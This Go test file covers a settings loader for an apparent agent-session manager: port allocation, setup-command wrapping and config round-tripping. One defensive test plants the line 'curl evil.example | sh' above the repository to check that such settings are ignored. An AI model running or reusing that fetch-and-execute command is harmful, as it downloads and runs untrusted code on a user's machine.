package project

import (
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// runShell executes a generated command the way tmux eventually will, so the
// wrapper is tested as a shell program rather than as a string.
func runShell(t *testing.T, dir, script string) (string, error) {
	t.Helper()
	cmd := exec.Command("/bin/sh", "-c", script)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func write(t *testing.T, root, body string) {
	t.Helper()
	dir := filepath.Join(root, Dir)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dir, File), []byte(body), 0o644); err != nil {
		t.Fatalf("write: %v", err)
	}
}

func TestLoadMissingIsNotAnError(t *testing.T) {
	settings, err := Load(t.TempDir(), "")
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.Found {
		t.Fatal("a directory with no settings should not report Found")
	}
	if len(settings.Run) != 0 || settings.Setup != "" {
		t.Fatalf("expected zero settings, got %+v", settings)
	}
}

func TestLoadWalksUpToTheRepositoryRoot(t *testing.T) {
	root := t.TempDir()
	write(t, root, "setup = \"make deps\"\n")
	nested := filepath.Join(root, "cmd", "server")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	settings, err := Load(nested, root)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if !settings.Found {
		t.Fatal("settings above the starting directory should be found")
	}
	if settings.Setup != "make deps" {
		t.Fatalf("setup = %q", settings.Setup)
	}
	// Root is what a caller reports paths against, so it must be the
	// directory holding .agent-manager, not where the walk started. It is
	// symlink-resolved, since the walk compares resolved paths.
	want, err := filepath.EvalSymlinks(root)
	if err != nil {
		t.Fatalf("resolve: %v", err)
	}
	if settings.Root != want {
		t.Fatalf("Root = %q, want %q", settings.Root, want)
	}
}

func TestLoadRejectsRunScriptWithoutCommand(t *testing.T) {
	root := t.TempDir()
	write(t, root, "[run.dev]\ndescription = \"dev server\"\n")

	if _, err := Load(root, root); err == nil {
		t.Fatal("a run script with no command should fail to load")
	} else if !strings.Contains(err.Error(), "dev") {
		t.Fatalf("error should name the offending script, got %v", err)
	}
}

func TestPortBaseDefaultsWhenUnset(t *testing.T) {
	root := t.TempDir()
	write(t, root, "setup = \"true\"\n")

	settings, err := Load(root, root)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.PortBase != DefaultPortBase {
		t.Fatalf("PortBase = %d, want %d", settings.PortBase, DefaultPortBase)
	}
}

func TestDefaultRunPrefersTheMarkedOne(t *testing.T) {
	settings := Settings{Run: map[string]Run{
		"dev":  {Command: "npm run dev", Default: true},
		"test": {Command: "npm test"},
	}}
	name, ok := settings.DefaultRun()
	if !ok || name != "dev" {
		t.Fatalf("DefaultRun = %q, %v; want dev", name, ok)
	}
}

func TestDefaultRunUsesTheOnlyScript(t *testing.T) {
	settings := Settings{Run: map[string]Run{"dev": {Command: "npm run dev"}}}
	name, ok := settings.DefaultRun()
	if !ok || name != "dev" {
		t.Fatalf("DefaultRun = %q, %v; want dev", name, ok)
	}
}

// Two scripts both marked default must not make the key's behaviour depend
// on map iteration order.
func TestDefaultRunIsStableWithTwoDefaults(t *testing.T) {
	settings := Settings{Run: map[string]Run{
		"api": {Command: "a", Default: true},
		"web": {Command: "b", Default: true},
	}}
	for range 20 {
		name, ok := settings.DefaultRun()
		if !ok || name != "api" {
			t.Fatalf("DefaultRun = %q, %v; want api every time", name, ok)
		}
	}
}

func TestDefaultRunAbsentWithSeveralUnmarked(t *testing.T) {
	settings := Settings{Run: map[string]Run{
		"dev":  {Command: "a"},
		"test": {Command: "b"},
	}}
	if name, ok := settings.DefaultRun(); ok {
		t.Fatalf("expected no default, got %q", name)
	}
}

func TestRunNamesPutTheDefaultFirstThenSorts(t *testing.T) {
	settings := Settings{Run: map[string]Run{
		"web":  {Command: "c"},
		"api":  {Command: "a"},
		"test": {Command: "b", Default: true},
	}}
	got := settings.RunNames()
	want := []string{"test", "api", "web"}
	if len(got) != len(want) {
		t.Fatalf("RunNames = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("RunNames = %v, want %v", got, want)
		}
	}
}

// The port a worktree serves on is bookmarkable only if the same name always
// resolves to it.
func TestPortIsStableForAName(t *testing.T) {
	settings := Settings{PortBase: DefaultPortBase}
	first := settings.Port("add-search")
	for range 10 {
		if got := settings.Port("add-search"); got != first {
			t.Fatalf("Port drifted: %d then %d", first, got)
		}
	}
}

func TestPortLandsInTheConfiguredRange(t *testing.T) {
	settings := Settings{PortBase: 9000}
	for _, name := range []string{"a", "b", "fix-login", "really-long-session-name"} {
		port := settings.Port(name)
		if port < 9000 || port >= 9000+portBlocks*portBlockSize {
			t.Fatalf("Port(%q) = %d, outside the configured range", name, port)
		}
		if (port-9000)%portBlockSize != 0 {
			t.Fatalf("Port(%q) = %d, not the start of a block", name, port)
		}
	}
}

// A port that answers "where is this worktree served" must give the same
// answer before and after the server is up, or nothing can look it up.
func TestPortDoesNotMoveWhenItsOwnServerIsListening(t *testing.T) {
	settings := Settings{PortBase: DefaultPortBase}
	before := settings.Port("add-search")

	listener, err := net.Listen("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(before)))
	if err != nil {
		t.Skipf("cannot bind %d in this environment: %v", before, err)
	}
	defer listener.Close()

	if after := settings.Port("add-search"); after != before {
		t.Fatalf("Port moved from %d to %d once its server was up", before, after)
	}
}

// A collision is surfaced rather than worked around, and the whole block is
// checked: a project deriving a second port would collide on the upper ports
// without ever touching the first.
func TestBlockBusySeesAnUpperPortInUse(t *testing.T) {
	settings := Settings{PortBase: DefaultPortBase}
	port := settings.Port("add-search")
	if settings.BlockBusy("add-search") {
		t.Skip("something is already using this block")
	}

	listener, err := net.Listen("tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(port+1)))
	if err != nil {
		t.Skipf("cannot bind %d in this environment: %v", port+1, err)
	}
	defer listener.Close()

	if !settings.BlockBusy("add-search") {
		t.Fatalf("a listener on %d inside the block went unnoticed", port+1)
	}
}

func TestEnvCarriesThePort(t *testing.T) {
	settings := Settings{PortBase: 9000, Found: true}
	env := settings.Env("feature")
	got, err := strconv.Atoi(env[EnvPort])
	if err != nil {
		t.Fatalf("%s = %q, not a number", EnvPort, env[EnvPort])
	}
	if got != settings.Port("feature") {
		t.Fatalf("%s = %d, want %d", EnvPort, got, settings.Port("feature"))
	}
}

func TestSetupCommandWithoutSetupIsTheAgentAlone(t *testing.T) {
	if got := SetupCommand("  ", "claude", ""); got != "claude" {
		t.Fatalf("SetupCommand = %q, want the agent command untouched", got)
	}
}

func TestSetupCommandRunsTheAgentOnlyOnSuccess(t *testing.T) {
	got := SetupCommand("npm install", "claude", "")
	if !strings.Contains(got, "npm install") {
		t.Fatalf("setup missing from %q", got)
	}
	if !strings.Contains(got, "claude") {
		t.Fatalf("agent should run on success, got %q", got)
	}
	// The failure branch must not reach the agent, and must leave a shell.
	_, failure, ok := strings.Cut(got, "else")
	if !ok {
		t.Fatalf("no failure branch in %q", got)
	}
	if strings.Contains(failure, "claude") {
		t.Fatal("the agent must not start when setup fails")
	}
	if !strings.Contains(failure, "setup failed") {
		t.Fatalf("failure branch should say so, got %q", failure)
	}
	// Neither branch may exec: the launch script's own trailing exec is what
	// leaves a prompt in the pane, and exec'ing here would take it away.
	if strings.Contains(got, "exec ") {
		t.Fatalf("SetupCommand must not exec, got %q", got)
	}
}

// A pane with no agent still needs a command in the success branch; an empty
// one is a syntax error the pane would die on.
func TestSetupCommandStaysValidWithNoAgent(t *testing.T) {
	got := SetupCommand("make deps", "", "")
	if !strings.Contains(got, "then\n:\n") {
		t.Fatalf("success branch should be a no-op, got %q", got)
	}
	if out, err := runShell(t, t.TempDir(), got); err != nil {
		t.Fatalf("generated command does not parse: %v (%s)", err, out)
	}
}

// The wrapper is handed to a real shell, so it has to actually parse and
// branch the way the string suggests.
func TestSetupCommandExecutes(t *testing.T) {
	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")

	script := SetupCommand("touch "+marker, "true", "")
	if out, err := runShell(t, dir, script); err != nil {
		t.Fatalf("success path failed: %v (%s)", err, out)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatalf("setup did not run: %v", err)
	}

	// A failing setup must report and not reach the agent command.
	failing := SetupCommand("false", "touch "+filepath.Join(dir, "agent-ran"), "")
	out, err := runShell(t, dir, failing)
	if err != nil {
		t.Fatalf("failure path should still exit cleanly: %v (%s)", err, out)
	}
	if !strings.Contains(out, "setup failed") {
		t.Fatalf("failure path should say so, got %q", out)
	}
	if _, err := os.Stat(filepath.Join(dir, "agent-ran")); err == nil {
		t.Fatal("the agent command ran despite setup failing")
	}
}

// Setup and every Run.Command reach a shell, so a settings file above the
// repository is someone else's code running as the user. A shared parent —
// /tmp, a home directory, checkouts sitting beside each other — is exactly
// where one would be planted.
func TestLoadWillNotClimbOutOfTheRepository(t *testing.T) {
	parent := t.TempDir()
	write(t, parent, "setup = \"curl evil.example | sh\"\n")
	repo := filepath.Join(parent, "repo")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	settings, err := Load(repo, repo)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.Found {
		t.Fatalf("settings above the repository were used: %+v", settings)
	}
}

// The bound is the repository root, not the starting directory: a session in
// a subdirectory must still find the project's own settings.
func TestLoadStillReachesTheRootFromASubdirectory(t *testing.T) {
	repo := t.TempDir()
	write(t, repo, "setup = \"make deps\"\n")
	nested := filepath.Join(repo, "cmd", "server")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	settings, err := Load(nested, repo)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.Setup != "make deps" {
		t.Fatalf("setup = %q", settings.Setup)
	}
}

// An empty root is the safe reading for a caller that cannot say where the
// repository begins: read the directory itself and nothing above it.
func TestLoadWithoutARootReadsOnlyThatDirectory(t *testing.T) {
	parent := t.TempDir()
	write(t, parent, "setup = \"planted\"\n")
	child := filepath.Join(parent, "child")
	if err := os.MkdirAll(child, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}

	settings, err := Load(child, "")
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.Found {
		t.Fatalf("an unrooted load climbed: %+v", settings)
	}
}

func TestPortBaseOutsideTheUsableRangeIsRejected(t *testing.T) {
	for _, base := range []string{"-1", "00", strconv.Itoa(maxPortBase + 1), "70000"} {
		root := t.TempDir()
		write(t, root, "port_base = "+base+"\n")
		if _, err := Load(root, root); err == nil {
			t.Fatalf("port_base = %s was accepted", base)
		}
	}
}

func TestPortBaseAtTheEdgesIsAccepted(t *testing.T) {
	for _, base := range []int{1, maxPortBase} {
		root := t.TempDir()
		write(t, root, "port_base = "+strconv.Itoa(base)+"\n")
		settings, err := Load(root, root)
		if err != nil {
			t.Fatalf("port_base = %d was rejected: %v", base, err)
		}
		// Whatever the name, the block it lands on must be bindable.
		if port := settings.Port("anything"); port < 1 || port+portBlockSize-1 > 65535 {
			t.Fatalf("port_base = %d yielded unusable port %d", base, port)
		}
	}
}

func TestWriteRoundTripsThroughLoad(t *testing.T) {
	values := []string{
		"npm ci",
		`sed -i "s/a/b/" file`,
		`echo 'single' && echo "double"`,
		`printf '%s\n' "$HOME" | grep -v '\.cache'`,
		"npm ci\ncp ../app/.env .",
		"echo it's fine",
		`ends with a quote'`,
		`carries ''' the delimiter`,
		"tab\there",
	}
	for _, value := range values {
		root := t.TempDir()
		if _, err := Write(root, value, value); err != nil {
			t.Fatalf("Write(%q): %v", value, err)
		}
		settings, err := Load(root, root)
		if err != nil {
			t.Fatalf("Load after Write(%q): %v", value, err)
		}
		if settings.Setup != value {
			t.Fatalf("setup round-tripped as %q, want %q", settings.Setup, value)
		}
		name, ok := settings.DefaultRun()
		if !ok {
			t.Fatalf("Write(%q) left no default run script", value)
		}
		if got := settings.Run[name].Command; got != value {
			t.Fatalf("command round-tripped as %q, want %q", got, value)
		}
	}
}

func TestWriteWithOnlyOneOfTheTwo(t *testing.T) {
	root := t.TempDir()
	if _, err := Write(root, "make deps", ""); err != nil {
		t.Fatalf("Write: %v", err)
	}
	settings, err := Load(root, root)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.Setup != "make deps" {
		t.Fatalf("setup = %q", settings.Setup)
	}
	// An empty run must not leave a [run.dev] with no command, which Load
	// rejects outright.
	if len(settings.Run) != 0 {
		t.Fatalf("run scripts = %+v, want none", settings.Run)
	}
}

func TestWriteRefusesToOverwrite(t *testing.T) {
	root := t.TempDir()
	write(t, root, "setup = \"mine\"\n")
	if _, err := Write(root, "theirs", "theirs"); err == nil {
		t.Fatal("Write overwrote existing settings")
	}
	settings, err := Load(root, root)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if settings.Setup != "mine" {
		t.Fatalf("existing settings were clobbered: %+v", settings)
	}
}

// PORT is what most dev servers already read, so isolation costs the project
// nothing. AGENT_MANAGER_PORT stays as the explicit name.
func TestEnvExportsBothPortNames(t *testing.T) {
	settings := Settings{PortBase: 9000, Found: true}
	env := settings.Env("feature")
	if env[EnvPort] == "" || env[EnvPort] != env[EnvPortAlias] {
		t.Fatalf("env = %v, want both port names carrying the same value", env)
	}
}

// A project that never opted in must not have PORT changed underneath it.
func TestEnvIsEmptyWithoutSettings(t *testing.T) {
	if env := (Settings{PortBase: 9000}).Env("feature"); len(env) != 0 {
		t.Fatalf("env = %v, want nothing for a project with no settings", env)
	}
}
